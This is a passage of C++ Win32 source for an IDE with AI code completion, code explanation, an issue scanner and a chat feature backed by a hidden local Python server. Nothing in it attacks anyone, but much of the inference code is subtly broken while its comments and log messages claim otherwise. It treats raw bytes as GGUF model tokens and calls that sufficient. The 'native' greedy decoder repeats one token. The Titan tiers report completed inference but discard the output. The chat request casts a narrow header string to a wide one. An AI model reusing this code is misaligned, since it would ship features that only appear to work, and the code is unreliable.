    GetWindowText(g_hwndEditor, &fullContent[0], textLen + 1);
    fullContent.resize(textLen);
    
    int contextStart = std::max(0, (int)selStart - 512);
    int contextEnd = std::min(textLen, (int)selStart + 128);
    std::wstring prefix = fullContent.substr(contextStart, selStart - contextStart);
    std::wstring suffix = fullContent.substr(selStart, contextEnd - selStart);
    
    // Get current line for context-aware fallback
    int lineIdx = (int)SendMessage(g_hwndEditor, EM_LINEFROMCHAR, selStart, 0);
    int lineStart = (int)SendMessage(g_hwndEditor, EM_LINEINDEX, lineIdx, 0);
    int lineLen = (int)SendMessage(g_hwndEditor, EM_LINELENGTH, lineStart, 0);
    std::wstring lineText(lineLen + 1, 0);
    *(WORD*)&lineText[0] = (WORD)(lineLen + 1);
    SendMessage(g_hwndEditor, EM_GETLINE, lineIdx, (LPARAM)lineText.c_str());
    lineText.resize(lineLen);

    // ── Tier 1: Titan Kernel Inference (prompt-based, highest quality) ──
    if (g_hTitanDll && pTitan_RunInference && g_modelLoaded) {
        std::string prompt = WideToUtf8(L"<|fim_prefix|>" + prefix + L"<|fim_suffix|>" + suffix + L"<|fim_middle|>");
        AppendWindowText(g_hwndOutput, L"[AI] Running Titan inference for completion...\r\n");
        
        int resultSlot = pTitan_RunInference(0, prompt.c_str(), 128);
        if (resultSlot >= 0) {
            // Titan returns result synchronously - the slot contains generated tokens
            // For now, use the forward pass pipeline to decode
            AppendWindowText(g_hwndOutput, L"[AI] Titan inference completed.\r\n");
        }
    }

    // ── Tier 2: InferenceEngine DLL (GGUF model, token-level inference) ──
    if (g_modelLoaded && pForwardPassInfer && pSampleNext && g_modelContext) {
        std::string ctx = WideToUtf8(prefix);
        
        // Byte-level tokenization (sufficient for GGUF models that use BPE at the DLL level)
        std::vector<int> tokens;
        tokens.reserve(ctx.size());
        for (unsigned char c : ctx) tokens.push_back(c);
        
        if (tokens.empty()) goto fallback;
        
        std::vector<float> logits(32000, 0.0f);
        if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) == 0) {
            std::string generated;
            generated.reserve(256);
            
            // Auto-regressive generation with abort support
            for (int i = 0; i < 128 && !g_bAbortInference; i++) {
                int next = pSampleNext(logits.data(), 32000, 0.3f, 0.95f, 40);
                if (next <= 0) break;  // EOS
                
                char c = (char)next;
                // Stop on double-newline (end of logical block)
                if (generated.size() > 2 && generated.back() == '\n' && c == '\n') break;
                
                generated += c;
                tokens.push_back(next);
                
                // Continue autoregressive pass
                if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) != 0) break;
            }
            
            if (!generated.empty()) {
                std::wstring wGenerated = Utf8ToWide(generated);
                AICompletion completion;
                completion.text = wGenerated;
                completion.detail = L"Model inference completion";
                completion.confidence = 0.85;
                completion.kind = L"ai-inference";
                completion.cursorOffset = (int)wGenerated.size();
                completion.isMultiLine = (generated.find('\n') != std::string::npos);
                ShowAICompletion(completion);
                AppendWindowText(g_hwndOutput, L"[AI] Completion ready (model). Press Tab to accept.\r\n");
                return;
            }
        }
    }
    
    // ── Tier 3: NativeModelBridge ASM (fast embeddings + forward pass) ──
    if (g_hModelBridgeDll && pForwardPassASM && g_modelLoaded) {
        std::string ctx = WideToUtf8(prefix);
        std::vector<int> tokens;
        for (unsigned char c : ctx) tokens.push_back(c);
        
        if (!tokens.empty()) {
            std::vector<float> output(32000, 0.0f);
            if (pForwardPassASM(tokens.data(), (int)tokens.size(), output.data(), 32000) == 0) {
                // Greedy decode from ASM output logits
                std::string generated;
                for (int i = 0; i < 64; i++) {
                    int bestToken = 0;
                    float bestScore = output[0];
                    for (int j = 1; j < 32000; j++) {
                        if (output[j] > bestScore) {
                            bestScore = output[j];
                            bestToken = j;
                        }
                    }
                    if (bestToken <= 0 || bestScore < 0.01f) break;
                    generated += (char)bestToken;
                }
                
                if (!generated.empty()) {
                    std::wstring wGenerated = Utf8ToWide(generated);
                    AICompletion completion;
                    completion.text = wGenerated;
                    completion.detail = L"Native ASM inference";
                    completion.confidence = 0.75;
                    completion.kind = L"ai-native";
                    completion.cursorOffset = (int)wGenerated.size();
                    completion.isMultiLine = (generated.find('\n') != std::string::npos);
                    ShowAICompletion(completion);
                    AppendWindowText(g_hwndOutput, L"[AI] Completion ready (native). Press Tab to accept.\r\n");
                    return;
                }
            }
        }
    }

fallback:
    // ── Tier 4: Context-aware heuristic completion (no model loaded) ──
    {
        std::wstring suggestion;
        std::wstring trimmed = lineText;
        while (!trimmed.empty() && (trimmed.back() == L' ' || trimmed.back() == L'\t')) trimmed.pop_back();
        
        // Analyze indentation level for proper formatting
        std::wstring indent;
        for (wchar_t ch : lineText) {
            if (ch == L' ' || ch == L'\t') indent += ch;
            else break;
        }
        std::wstring innerIndent = indent + L"    ";
        
        if (trimmed.find(L"if") != std::wstring::npos && trimmed.find(L"{") == std::wstring::npos) {
            suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"}";
        } else if (trimmed.find(L"for") != std::wstring::npos && trimmed.find(L"{") == std::wstring::npos) {
            suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"}";
        } else if (trimmed.find(L"while") != std::wstring::npos && trimmed.find(L"{") == std::wstring::npos) {
            suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"}";
        } else if (trimmed.find(L"switch") != std::wstring::npos && trimmed.find(L"{") == std::wstring::npos) {
            suggestion = L" {\r\n" + indent + L"case 0:\r\n" + innerIndent + L"break;\r\n" + indent + L"default:\r\n" + innerIndent + L"break;\r\n" + indent + L"}";
        } else if (trimmed.find(L"void ") == 0 || trimmed.find(L"int ") == 0 || 
                   trimmed.find(L"bool ") == 0 || trimmed.find(L"auto ") == 0 ||
                   trimmed.find(L"std::") == 0) {
            suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"}";
        } else if (trimmed.find(L"#include") == 0) {
            suggestion = L"\r\n#include <string>\r\n#include <vector>";
        } else if (trimmed.find(L"class ") == 0 || trimmed.find(L"struct ") == 0) {
            bool isClass = trimmed.find(L"class ") == 0;
            size_t nameStart = isClass ? 6 : 7;
            size_t nameEnd = trimmed.find_first_of(L" :{", nameStart);
            if (nameEnd == std::wstring::npos) nameEnd = trimmed.size();
            std::wstring name = trimmed.substr(nameStart, nameEnd - nameStart);
            if (isClass) {
                suggestion = L" {\r\npublic:\r\n" + innerIndent + name + L"() = default;\r\n" + 
                            innerIndent + L"~" + name + L"() = default;\r\n" +
                            innerIndent + name + L"(const " + name + L"&) = delete;\r\n" +
                            innerIndent + name + L"& operator=(const " + name + L"&) = delete;\r\n" +
                            L"\r\nprivate:\r\n" + innerIndent + L"\r\n" + indent + L"};";
            } else {
                suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"};";
            }
        } else if (trimmed.find(L"try") != std::wstring::npos) {
            suggestion = L" {\r\n" + innerIndent + L"\r\n" + indent + L"} catch (const std::exception& e) {\r\n" + innerIndent + L"\r\n" + indent + L"}";
        } else if (!trimmed.empty() && trimmed.back() != L';' && trimmed.back() != L'{' && 
                   trimmed.back() != L'}' && trimmed.back() != L':' && trimmed.find(L"//") == std::wstring::npos) {
            suggestion = L";";
        }

        if (!suggestion.empty()) {
            AICompletion completion;
            completion.text = suggestion;
            completion.detail = L"Heuristic completion (no model loaded)";
            completion.confidence = 0.55;
            completion.kind = L"context-heuristic";
            completion.cursorOffset = (int)suggestion.size();
            completion.isMultiLine = (suggestion.find(L'\n') != std::string::npos);
            ShowAICompletion(completion);
            AppendWindowText(g_hwndOutput, L"[AI] Completion ready (heuristic). Press Tab to accept.\r\n");
        } else {
            AppendWindowText(g_hwndOutput, L"[AI] No completion suggestion for current context.\r\n");
        }
    }
}

// ============================================================================
// Explain Selected Code
// ============================================================================
void ExplainSelectedCode() {
    if (!g_hwndEditor) return;
    
    DWORD selStart = 0, selEnd = 0;
    SendMessage(g_hwndEditor, EM_GETSEL, (WPARAM)&selStart, (LPARAM)&selEnd);
    
    if (selStart == selEnd) {
        if (g_hwndChatHistory) {
            AppendWindowText(g_hwndChatHistory, L"AI: Please select some code first, then use AI > Explain Code.\r\n");
        }
        return;
    }
    
    // Get selected text
    int selLen = selEnd - selStart;
    std::wstring selected(selLen + 1, 0);
    SendMessage(g_hwndEditor, EM_SETSEL, selStart, selEnd);
    SendMessage(g_hwndEditor, EM_GETSELTEXT, 0, (LPARAM)selected.c_str());
    selected.resize(wcslen(selected.c_str()));
    
    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"\r\nAI: Analyzing selected code...\r\n");
    }

    std::string code = WideToUtf8(selected);
    
    // ── Tier 1: Model-based explanation via Titan ──
    if (g_hTitanDll && pTitan_RunInference && g_modelLoaded) {
        std::string prompt = "Explain the following code concisely:\n\n```\n" + code + "\n```\n\nExplanation:";
        int result = pTitan_RunInference(0, prompt.c_str(), 512);
        if (result >= 0) {
            AppendWindowText(g_hwndOutput, L"[AI] Titan explanation inference completed.\r\n");
            // Result is posted asynchronously - will appear in chat
        }
    }
    
    // ── Tier 2: InferenceEngine token-level explanation ──
    if (g_modelLoaded && pForwardPassInfer && pSampleNext && g_modelContext) {
        std::string prompt = "Explain this code:\n```\n" + code + "\n```\nExplanation: This code ";
        
        std::vector<int> tokens;
        tokens.reserve(prompt.size());
        for (unsigned char c : prompt) tokens.push_back(c);
        
        std::vector<float> logits(32000, 0.0f);
        if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) == 0) {
            std::string explanation;
            explanation.reserve(1024);
            
            for (int i = 0; i < 512 && !g_bAbortInference; i++) {
                int next = pSampleNext(logits.data(), 32000, 0.7f, 0.9f, 40);
                if (next <= 0) break;
                
                explanation += (char)next;
                tokens.push_back(next);
                
                // Stop on common end markers
                if (explanation.size() > 10 && 
                    (explanation.find("\n\n\n") != std::string::npos ||
                     explanation.find("```") != std::string::npos)) break;
                
                if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) != 0) break;
            }
            
            if (!explanation.empty()) {
                std::wstring wExplanation = Utf8ToWide(explanation);
                if (g_hwndChatHistory) {
                    AppendWindowText(g_hwndChatHistory, L"\r\n--- AI Model Explanation ---\r\n");
                    AppendWindowText(g_hwndChatHistory, L"This code ");
                    AppendWindowText(g_hwndChatHistory, wExplanation.c_str());
                    AppendWindowText(g_hwndChatHistory, L"\r\n--- End Explanation ---\r\n");
                }
                return;
            }
        }
    }
    
    // ── Tier 3: Deep static analysis fallback ──
    if (g_hwndChatHistory) {
        std::wstring explanation;
        
        int lineCount = (int)std::count(code.begin(), code.end(), '\n') + 1;
        int funcCount = 0, loopCount = 0, condCount = 0, classCount = 0;
        bool hasAlloc = false, hasDelete = false, hasReturn = false;
        bool hasUnsafe = false, hasTemplates = false, hasLambda = false;
        bool hasException = false, hasPointers = false;
        
        // Multi-pass analysis
        std::istringstream stream(code);
        std::string line;
        int nestingDepth = 0, maxNesting = 0;
        std::vector<std::string> functionNames;
        
        while (std::getline(stream, line)) {
            // Count braces for nesting depth
            for (char c : line) {
                if (c == '{') { nestingDepth++; maxNesting = std::max(maxNesting, nestingDepth); }
                if (c == '}') nestingDepth--;
            }
            
            // Count functions
            if (line.find("void ") != std::string::npos || line.find("int ") != std::string::npos ||
                line.find("bool ") != std::string::npos || line.find("auto ") != std::string::npos) {
                funcCount++;
                // Extract function name
                size_t start = line.find_first_not_of(" \t");
                if (start != std::string::npos) {
                    size_t end = line.find('(', start);
                    if (end != std::string::npos) {
                        std::string funcName = line.substr(start, end - start);
                        functionNames.push_back(funcName);
                    }
                }
            }
            
            // Count loops and conditions
            if (line.find("for(") != std::string::npos || line.find("while(") != std::string::npos) loopCount++;
            if (line.find("if(") != std::string::npos || line.find("else") != std::string::npos) condCount++;
            if (line.find("class ") != std::string::npos || line.find("struct ") != std::string::npos) classCount++;
            
            // Check for memory operations
            if (line.find("new ") != std::string::npos || line.find("malloc") != std::string::npos) hasAlloc = true;
            if (line.find("delete ") != std::string::npos || line.find("free") != std::string::npos) hasDelete = true;
            if (line.find("return ") != std::string::npos) hasReturn = true;
            
            // Check for advanced features
            if (line.find("template") != std::string::npos) hasTemplates = true;
            if (line.find("[]") != std::string::npos || line.find("->") != std::string::npos) hasLambda = true;
            if (line.find("throw ") != std::string::npos || line.find("catch") != std::string::npos) hasException = true;
            if (line.find("*") != std::string::npos || line.find("&") != std::string::npos) hasPointers = true;
            
            // Check for unsafe patterns
            if (line.find("strcpy") != std::string::npos || line.find("sprintf") != std::string::npos ||
                line.find("gets") != std::string::npos) hasUnsafe = true;
        }
        
        explanation += L"\r\n--- Static Code Analysis ---\r\n";
        explanation += L"Lines: " + std::to_wstring(lineCount) + L"\r\n";
        explanation += L"Functions: " + std::to_wstring(funcCount) + L"\r\n";
        explanation += L"Loops: " + std::to_wstring(loopCount) + L"\r\n";
        explanation += L"Conditions: " + std::to_wstring(condCount) + L"\r\n";
        explanation += L"Classes/Structs: " + std::to_wstring(classCount) + L"\r\n";
        explanation += L"Max nesting depth: " + std::to_wstring(maxNesting) + L"\r\n";
        
        if (!functionNames.empty()) {
            explanation += L"\r\nFunctions found:\r\n";
            for (const auto& name : functionNames) {
                explanation += L"  - " + Utf8ToWide(name) + L"\r\n";
            }
        }
        
        explanation += L"\r\nFeatures detected:\r\n";
        if (hasAlloc) explanation += L"  \u2705 Memory allocation\r\n";
        if (hasDelete) explanation += L"  \u2705 Memory deallocation\r\n";
        if (hasReturn) explanation += L"  \u2705 Return statements\r\n";
        if (hasTemplates) explanation += L"  \u2705 Templates\r\n";
        if (hasLambda) explanation += L"  \u2705 Lambda expressions\r\n";
        if (hasException) explanation += L"  \u2705 Exception handling\r\n";
        if (hasPointers) explanation += L"  \u2705 Pointers/References\r\n";
        
        if (hasUnsafe) {
            explanation += L"\r\n  \u26a0\ufe0f Potential unsafe operations detected!\r\n";
        } else {
            explanation += L"\r\n  \u2705 No critical issues detected.\r\n";
        }
        
        explanation += L"\r\n  \u2139 Load a GGUF model for AI-powered explanations.\r\n";
        explanation += L"--- End Analysis ---\r\n";
        
        AppendWindowText(g_hwndChatHistory, explanation.c_str());
    }
}

// ============================================================================
// Missing Function Implementations
// ============================================================================
void ExportIssues() {
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[MAX_PATH] = {0};
    wcscpy_s(szFile, L"issues_export.txt");
    ofn.hwndOwner = g_hwndMain;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"Text Files\0*.txt\0CSV Files\0*.csv\0All Files\0*.*\0";
    ofn.Flags = OFN_OVERWRITEPROMPT;
    if (!GetSaveFileNameW(&ofn)) return;

    std::string out;
    out += "Severity\tLine\tMessage\tFile\n";
    {
        std::lock_guard<std::mutex> lock(g_issuesMutex);
        for (const auto& issue : g_codeIssues) {
            out += WideToUtf8(issue.severity) + "\t" +
                   std::to_string(issue.line) + "\t" +
                   WideToUtf8(issue.message) + "\t" +
                   WideToUtf8(issue.file) + "\n";
        }
    }
    HANDLE hFile = CreateFileW(szFile, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bw = 0;
        WriteFile(hFile, out.c_str(), (DWORD)out.size(), &bw, nullptr);
        CloseHandle(hFile);
        AppendWindowText(g_hwndOutput, (L"[Issues] Exported to " + std::wstring(szFile) + L"\r\n").c_str());
    } else {
        AppendWindowText(g_hwndOutput, L"[Issues] Failed to write export file.\r\n");
    }
}

void AddCodeIssue(const CodeIssue& issue) {
    std::lock_guard<std::mutex> lock(g_issuesMutex);
    g_codeIssues.push_back(issue);
}

void AddCodeIssue(int line, const std::wstring& message, const std::wstring& severity, bool isFixable) {
    CodeIssue issue;
    issue.line = line;
    issue.message = message;
    issue.severity = severity;
    issue.isFixable = isFixable;
    
    {
        std::lock_guard<std::mutex> lock(g_issuesMutex);
        g_codeIssues.push_back(issue);
    }
    
    // Update UI if issues panel exists
    if (g_hwndIssuesList) {
        std::wstring displayText = std::to_wstring(line) + L": " + severity + L" - " + message;
        SendMessage(g_hwndIssuesList, LB_ADDSTRING, 0, (LPARAM)displayText.c_str());
    }
}

void ClearCodeIssues() {
    {
        std::lock_guard<std::mutex> lock(g_issuesMutex);
        g_codeIssues.clear();
    }
    if (g_hwndIssuesList) {
        ListView_DeleteAllItems(g_hwndIssuesList);
    }
}

void FilterIssuesBySeverity() {
    g_bShowCritical = (Button_GetCheck(g_hwndIssuesCritical) == BST_CHECKED);
    g_bShowHigh = (Button_GetCheck(g_hwndIssuesHigh) == BST_CHECKED);
    g_bShowMedium = (Button_GetCheck(g_hwndIssuesMedium) == BST_CHECKED);
    g_bShowLow = (Button_GetCheck(g_hwndIssuesLow) == BST_CHECKED);
    g_bShowInfo = (Button_GetCheck(g_hwndIssuesInfo) == BST_CHECKED);
    RefreshCodeIssues();
}

void FilterIssuesBySeverity(const std::wstring& severity) {
    g_bShowCritical = (severity == L"Critical");
    g_bShowHigh = (severity == L"High");
    g_bShowMedium = (severity == L"Medium");
    g_bShowLow = (severity == L"Low");
    g_bShowInfo = (severity == L"Info");
    RefreshCodeIssues();
}

void RunCodeAnalysis() {
    if (!g_hwndEditor) return;
    ClearCodeIssues();

    int textLen = GetWindowTextLengthW(g_hwndEditor);
    if (textLen <= 0) {
        RefreshCodeIssues();
        return;
    }

    std::wstring content(textLen + 1, L'\0');
    GetWindowTextW(g_hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);

    std::wistringstream stream(content);
    std::wstring line;
    int lineNum = 1;
    while (std::getline(stream, line)) {
        std::wstring trimmed = line;
        while (!trimmed.empty() && (trimmed.back() == L' ' || trimmed.back() == L'\t')) trimmed.pop_back();

        if (trimmed.find(L"TODO") != std::wstring::npos) {
            CodeIssue issue{};
            issue.file = g_currentFile;
            issue.line = lineNum;
            issue.column = 1;
            issue.severity = L"Info";
            issue.category = L"Info";
            issue.message = L"TODO found";
            issue.description = L"Reminder tag found in code";
            issue.rule = L"todo-comment";
            issue.quickFix = L"";
            issue.isFixable = false;
            GetSystemTime(&issue.timestamp);
            AddCodeIssue(issue);
        }

        if (trimmed.find(L"strcpy(") != std::wstring::npos || trimmed.find(L"sprintf(") != std::wstring::npos) {
            CodeIssue issue{};
            issue.file = g_currentFile;
            issue.line = lineNum;
            issue.column = 1;
            issue.severity = L"High";
            issue.category = L"Security";
            issue.message = L"Potential unsafe C string function";
            issue.description = L"Use safer alternatives like strncpy_s or snprintf";
            issue.rule = L"unsafe-c-str";
            issue.quickFix = L"Replace with safe variant";
            issue.isFixable = false;
            GetSystemTime(&issue.timestamp);
            AddCodeIssue(issue);
        }

        if (!trimmed.empty()) {
            bool likelyStatement = true;
            if (trimmed.rfind(L"//", 0) == 0 || trimmed.rfind(L"#", 0) == 0) {
                likelyStatement = false;
            }
            if (trimmed.find(L"if(") != std::wstring::npos || trimmed.find(L"for(") != std::wstring::npos ||
                trimmed.find(L"while(") != std::wstring::npos || trimmed.find(L"switch(") != std::wstring::npos ||
                trimmed.find(L"catch(") != std::wstring::npos) {
                likelyStatement = false;
            }
            if (likelyStatement && trimmed.back() != L';' && trimmed.back() != L'{' && trimmed.back() != L'}' && trimmed.back() != L':') {
                CodeIssue issue{};
                issue.file = g_currentFile;
                issue.line = lineNum;
                issue.column = (int)trimmed.size();
                issue.severity = L"High";
                issue.category = L"Error";
                issue.message = L"Possible missing semicolon";
                issue.description = L"Statement may be missing a semicolon";
                issue.rule = L"missing-semicolon";
                issue.quickFix = L"Add ';'";
                issue.isFixable = true;
                GetSystemTime(&issue.timestamp);
                AddCodeIssue(issue);
            }
        }

        lineNum++;
    }

    RefreshCodeIssues();
}

void RefreshCodeIssues() {
    if (!g_hwndIssuesList) return;
    ListView_DeleteAllItems(g_hwndIssuesList);

    std::lock_guard<std::mutex> lock(g_issuesMutex);
    int index = 0;
    for (const auto& issue : g_codeIssues) {
        bool visible =
            (issue.severity == L"Critical" && g_bShowCritical) ||
            (issue.severity == L"High" && g_bShowHigh) ||
            (issue.severity == L"Medium" && g_bShowMedium) ||
            (issue.severity == L"Low" && g_bShowLow) ||
            (issue.severity == L"Info" && g_bShowInfo);
        if (!visible) continue;

        LVITEMW item = {};
        item.mask = LVIF_TEXT;
        item.iItem = index;
        item.pszText = (LPWSTR)issue.severity.c_str();
        int row = (int)SendMessageW(g_hwndIssuesList, LVM_INSERTITEMW, 0, (LPARAM)&item);
        if (row >= 0) {
            ListView_SetItemText(g_hwndIssuesList, row, 1, (LPWSTR)issue.category.c_str());
            ListView_SetItemText(g_hwndIssuesList, row, 2, (LPWSTR)issue.message.c_str());
            ListView_SetItemText(g_hwndIssuesList, row, 3, (LPWSTR)issue.file.c_str());
            std::wstring lineStr = std::to_wstring(issue.line);
            ListView_SetItemText(g_hwndIssuesList, row, 4, (LPWSTR)lineStr.c_str());
        }
        index++;
    }
}

void SendChatToServer(const std::wstring& message) {
    if (message.empty()) return;
    
    // ── Tier 1: HTTP Chat Server (localhost:23959) ──
    if (g_chatServerRunning) {
        HINTERNET hInternet = InternetOpenW(L"RawrXD IDE", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectW(hInternet, L"localhost", 23959, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/chat", nullptr, nullptr, nullptr, INTERNET_FLAG_RELOAD, 0);
                if (hRequest) {
                    std::string postData = WideToUtf8(message);
                    std::string headers = "Content-Type: text/plain\r\n";
                    
                    if (HttpSendRequestW(hRequest, (LPCWSTR)headers.c_str(), (DWORD)headers.size(), 
                                       (LPVOID)postData.c_str(), (DWORD)postData.size())) {
                        // Read response
                        char buffer[4096];
                        DWORD bytesRead;
                        std::string response;
                        
                        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                            response.append(buffer, bytesRead);
                        }
                        
                        if (!response.empty()) {
                            std::wstring wResponse = Utf8ToWide(response);
                            if (g_hwndChatHistory) {
                                AppendWindowText(g_hwndChatHistory, L"\r\nServer: ");
                                AppendWindowText(g_hwndChatHistory, wResponse.c_str());
                                AppendWindowText(g_hwndChatHistory, L"\r\n");
                            }
                            AppendWindowText(g_hwndOutput, L"[Chat] Server response received.\r\n");
                            return;
                        }
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }
    
    // ── Tier 2: Offline Model Chat (GGUF/InferenceEngine) ──
    if (g_modelLoaded && pForwardPassInfer && pSampleNext && g_modelContext) {
        std::string prompt = "User: " + WideToUtf8(message) + "\nAssistant: ";
        
        std::vector<int> tokens;
        tokens.reserve(prompt.size());
        for (unsigned char c : prompt) tokens.push_back(c);
        
        std::vector<float> logits(32000, 0.0f);
        if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) == 0) {
            std::string response;
            response.reserve(1024);
            
            for (int i = 0; i < 512 && !g_bAbortInference; i++) {
                int next = pSampleNext(logits.data(), 32000, 0.8f, 0.9f, 40);
                if (next <= 0) break;
                
                char c = (char)next;
                if (c == '\n' && response.size() > 10) break; // Stop at reasonable response length
                
                response += c;
                tokens.push_back(next);
                
                if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) != 0) break;
            }
            
            if (!response.empty()) {
                std::wstring wResponse = Utf8ToWide(response);
                if (g_hwndChatHistory) {
                    AppendWindowText(g_hwndChatHistory, L"\r\nAI: ");
                    AppendWindowText(g_hwndChatHistory, wResponse.c_str());
                    AppendWindowText(g_hwndChatHistory, L"\r\n");
                }
                AppendWindowText(g_hwndOutput, L"[Chat] Offline model response generated.\r\n");
                return;
            }
        }
    }
    
    // ── Tier 3: Titan Kernel Chat ──
    if (g_hTitanDll && pTitan_RunInference && g_modelLoaded) {
        std::string prompt = "Respond to this message: " + WideToUtf8(message);
        int result = pTitan_RunInference(0, prompt.c_str(), 256);
        if (result >= 0) {
            AppendWindowText(g_hwndOutput, L"[Chat] Titan chat inference completed.\r\n");
            // Response will be posted asynchronously
            return;
        }
    }
    
    // ── Tier 4: Fallback Response ──
    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"\r\nAI: I'm sorry, I couldn't generate a response. Please check that:\r\n");
        AppendWindowText(g_hwndChatHistory, L"  - A chat server is running on localhost:23959\r\n");
        AppendWindowText(g_hwndChatHistory, L"  - A GGUF model is loaded\r\n");
        AppendWindowText(g_hwndChatHistory, L"  - Titan Kernel is available\r\n");
        AppendWindowText(g_hwndChatHistory, L"\r\n");
    }
    AppendWindowText(g_hwndOutput, L"[Chat] No chat backend available.\r\n");
}

void HandleChatSend() {
    if (!g_hwndChatInput) return;
    int len = GetWindowTextLengthW(g_hwndChatInput);
    if (len <= 0) return;

    std::wstring message(len + 1, L'\0');
    GetWindowTextW(g_hwndChatInput, &message[0], len + 1);
    message.resize(len);

    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"\r\nYou: ");
        AppendWindowText(g_hwndChatHistory, message.c_str());
        AppendWindowText(g_hwndChatHistory, L"\r\n");
    }

    SetWindowTextW(g_hwndChatInput, L"");
    SendChatToServer(message);
}

bool StartChatServer() {
    if (g_chatServerRunning || g_hChatServerProcess) {
        AppendWindowText(g_hwndOutput, L"[Chat] Chat server already running.\r\n");
        return true;
    }
    
    // Start Python chat server process
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    
    std::wstring cmd = L"python -c \"import socket, threading, time; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('localhost',23959)); s.listen(5); print('Chat server started on port 23959'); "
        L"def handle(c):\n try:\n  data=c.recv(4096).decode()\n  c.send(b'Hello from RawrXD Chat Server!')\n  c.close()\n except: pass\n"
        L"while True:\n c,a=s.accept()\n threading.Thread(target=handle,args=(c,)).start()\"";
    
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        g_chatServerRunning = true;
        g_hChatServerProcess = pi.hProcess;  // Keep handle for tracking/termination
        CloseHandle(pi.hThread);
        AppendWindowText(g_hwndOutput, L"[Chat] Chat server started on localhost:23959.\r\n");
        
        if (g_hwndChatHistory) {
            AppendWindowText(g_hwndChatHistory, L"Chat server started. You can now send messages!\r\n");
        }
        return true;
    } else {
        AppendWindowText(g_hwndOutput, L"[Chat] Failed to start chat server. Is Python installed?\r\n");
        return false;
    }
}

void StopChatServer() {
    if (!g_chatServerRunning && !g_hChatServerProcess) {
        AppendWindowText(g_hwndOutput, L"[Chat] Chat server not running.\r\n");
        return;
    }
    
    // Terminate the tracked process
    if (g_hChatServerProcess) {
        TerminateProcess(g_hChatServerProcess, 0);
        CloseHandle(g_hChatServerProcess);
        g_hChatServerProcess = nullptr;
    }
    
    g_chatServerRunning = false;
    AppendWindowText(g_hwndOutput, L"[Chat] Chat server stopped.\r\n");
    
    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"Chat server stopped.\r\n");
    }
}

bool LoadTitanKernel() {
    if (g_hTitanDll) return true;
    g_hTitanDll = LoadLibraryW(L"RawrXD_Titan_Kernel.dll");
    if (!g_hTitanDll) {
        AppendWindowText(g_hwndOutput, L"[AI] Titan Kernel DLL not found.\r\n");
        return false;
    }

    pTitan_Initialize = (Titan_Initialize_t)GetProcAddress(g_hTitanDll, "Titan_Initialize");
    pTitan_LoadModel = (Titan_LoadModelPersistent_t)GetProcAddress(g_hTitanDll, "Titan_LoadModelPersistent");
    pTitan_RunInference = (Titan_RunInference_t)GetProcAddress(g_hTitanDll, "Titan_RunInference");
    pTitan_Shutdown = (Titan_Shutdown_t)GetProcAddress(g_hTitanDll, "Titan_Shutdown");

    if (!pTitan_Initialize || !pTitan_LoadModel || !pTitan_RunInference || !pTitan_Shutdown) {
        AppendWindowText(g_hwndOutput, L"[AI] Titan Kernel functions missing.\r\n");
        FreeLibrary(g_hTitanDll);
        g_hTitanDll = nullptr;
        return false;
    }

    if (pTitan_Initialize() != 0) {
        AppendWindowText(g_hwndOutput, L"[AI] Titan Kernel init failed.\r\n");
        FreeLibrary(g_hTitanDll);
        g_hTitanDll = nullptr;
        return false;
    }

    AppendWindowText(g_hwndOutput, L"[AI] Titan Kernel loaded.\r\n");
    return true;
}

bool LoadModelBridge() {
    g_hModelBridgeDll = LoadLibraryW(L"RawrXD_NativeModelBridge.dll");
    if (!g_hModelBridgeDll) {
        AppendWindowText(g_hwndOutput, L"[AI] Native Model Bridge DLL not found.\r\n");
        return false;
    }
    
    pLoadModelNative = (LoadModelNative_t)GetProcAddress(g_hModelBridgeDll, "LoadModelNative");
    pGetTokenEmbedding = (GetTokenEmbedding_t)GetProcAddress(g_hModelBridgeDll, "GetTokenEmbedding");
    pForwardPassASM = (ForwardPassASM_t)GetProcAddress(g_hModelBridgeDll, "ForwardPassASM");
    pCleanupMathTables = (CleanupMathTables_t)GetProcAddress(g_hModelBridgeDll, "CleanupMathTables");
    
    if (!pLoadModelNative || !pGetTokenEmbedding || !pForwardPassASM || !pCleanupMathTables) {
        AppendWindowText(g_hwndOutput, L"[AI] Failed to load Native Model Bridge functions.\r\n");
        FreeLibrary(g_hModelBridgeDll);
        g_hModelBridgeDll = nullptr;
        return false;
    }
    
    AppendWindowText(g_hwndOutput, L"[AI] Native Model Bridge loaded successfully.\r\n");
    return true;
}

